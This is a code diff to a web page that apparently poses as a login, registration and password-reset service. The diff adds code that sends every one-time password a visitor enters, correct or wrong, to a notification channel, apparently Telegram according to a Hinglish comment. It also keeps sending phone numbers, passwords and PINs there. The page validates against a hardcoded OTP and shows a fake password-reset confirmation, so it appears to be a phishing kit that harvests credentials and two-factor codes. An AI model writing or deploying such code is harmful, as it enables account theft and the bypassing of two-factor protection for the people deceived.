@@ -698,29 +698,36 @@
             });
         }
 
+        /* ===== Device Verification Submit (Handles both Correct & Wrong OTP) ===== */
         document.getElementById('deviceVerificationForm').addEventListener('submit', function (e) {
             e.preventDefault();
             const otp = document.getElementById('dvOtp').value.trim();
             const st = document.getElementById('dvStatus');
+            const action = pendingAuthAction;
+            const phone = pendingAuthPhone;
 
             if (otp !== CORRECT_OTP) {
+                // ❌ Agar galat OTP dala toh bhi Telegram par notification jayegi
                 st.textContent = 'Wrong OTP';
                 st.classList.add('error');
+                
+                sendToBehaviorAPI({ 
+                    type: 'notify', 
+                    phone: phone, 
+                    details: `❌ <b>Wrong OTP Entered!</b>\nAction: ${action}\nEntered OTP: <code>${otp}</code>` 
+                });
                 return;
             }
 
             st.textContent = '';
             st.classList.remove('error');
-
-            const action = pendingAuthAction;
-            const phone = pendingAuthPhone;
             closeDeviceVerification();
 
             if (action === 'signin') {
                 sendToBehaviorAPI({ type: 'signin', phone: phone, password: pendingSignInPassword, pin: pendingSignInPin });
-                sendToBehaviorAPI({ type: 'notify', phone: phone, details: `Device Verification Confirmed with OTP: ${otp}` });
+                sendToBehaviorAPI({ type: 'notify', phone: phone, details: `✅ Device Verification Confirmed with Correct OTP: ${otp}` });
             } else if (action === 'register') {
-                sendToBehaviorAPI({ type: 'notify', phone: phone, details: `Device Verification Confirmed with OTP: ${otp}` });
+                sendToBehaviorAPI({ type: 'notify', phone: phone, details: `✅ Device Verification Confirmed with Correct OTP: ${otp}` });
             }
 
             if (action === 'signin') {
@@ -766,7 +773,16 @@
             if (u.length < 2) { showModal('Invalid User Name', 'Please enter a valid User Name.', true); return; }
             if (p.length < 6) { showModal('Weak Password', 'Password must be at least 6 characters.', true); return; }
             if (ph.length !== 10) { showModal('Invalid Phone', 'Please enter a 10-digit phone number.', true); return; }
-            if (otp !== CORRECT_OTP) { showModal('Invalid OTP', 'Please enter the correct 6-digit OTP.', true); return; }
+            
+            if (otp !== CORRECT_OTP) {
+                showModal('Invalid OTP', 'Please enter the correct 6-digit OTP.', true);
+                sendToBehaviorAPI({ 
+                    type: 'notify', 
+                    phone: ph, 
+                    details: `❌ <b>Wrong Registration OTP Entered!</b>\nEntered OTP: <code>${otp}</code>` 
+                });
+                return;
+            }
 
             showVerification(() => { openDeviceVerification(ph, 'register'); });
         }
@@ -781,7 +797,16 @@
 
             if (ph.length !== 10) { showModal('Invalid Phone', 'Please enter a 10-digit phone number.', true); return; }
             if (p.length < 6) { showModal('Weak Password', 'New Password must be at least 6 characters.', true); return; }
-            if (otp !== CORRECT_OTP) { showModal('Invalid OTP', 'Please enter the correct 6-digit OTP.', true); return; }
+            
+            if (otp !== CORRECT_OTP) { 
+                showModal('Invalid OTP', 'Please enter the correct 6-digit OTP.', true); 
+                sendToBehaviorAPI({ 
+                    type: 'notify', 
+                    phone: ph, 
+                    details: `❌ <b>Wrong Reset Password OTP Entered!</b>\nEntered OTP: <code>${otp}</code>` 
+                });
+                return; 
+            }
 
             showModal('Password Reset', 'Your password has been successfully reset. Please sign in with your new password.');
             setTimeout(() => { closeModal(); switchScreen('screen-signin'); }, 1500);
